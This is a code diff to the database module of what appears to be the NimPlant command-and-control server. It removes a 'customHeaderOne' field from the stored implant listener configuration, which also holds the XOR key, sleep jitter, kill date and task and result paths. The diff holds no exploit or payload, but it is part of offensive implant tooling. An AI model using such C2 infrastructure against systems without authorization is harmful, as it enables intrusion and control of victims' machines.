@@ -29,7 +29,7 @@ def initDb():
         listenerType TEXT, listenerIp TEXT, listenerHost TEXT, listenerPort INTEGER,
         registerPath TEXT, taskPath TEXT, resultPath TEXT, riskyMode BOOLEAN,
         sleepTime INTEGER, sleepJitter INTEGER, killDate TEXT,
-        userAgent TEXT, customHeaderOne TEXT, killed BOOLEAN)
+        userAgent TEXT, killed BOOLEAN)
         """
         )
 
@@ -99,7 +99,6 @@ def dbPreviousServerSameConfig(nimplant_server, xor_key) -> bool:
             or nimplant_server["riskyMode"] != prevServer["riskyMode"]
             or nimplant_server["killDate"] != prevServer["killDate"]
             or nimplant_server["userAgent"] != prevServer["userAgent"]
-            or nimplant_server["customHeaderOne"] != prevServer["customHeaderOne"]
         ):
             return False
 
@@ -142,7 +141,7 @@ def dbInitNewServer(np_server):
                        VALUES (:guid, :name, CURRENT_TIMESTAMP, :xorKey, :managementIp, :managementPort,
                        :listenerType, :listenerIp, :listenerHost, :listenerPort, :registerPath,
                        :taskPath, :resultPath, :riskyMode, :sleepTime, :sleepJitter,
-                       :killDate, :userAgent, :customHeaderOne, :killed)""",
+                       :killDate, :userAgent, :killed)""",
             np_server.asdict(),
         )
         con.commit()
@@ -349,7 +348,6 @@ def dbGetServerInfo(serverGuid):
                 "sleepJitter": res["sleepJitter"],
                 "killDate": res["killDate"],
                 "userAgent": res["userAgent"],
-                "customHeaderOne": res["customHeaderOne"],
             },
         }
         return resJson
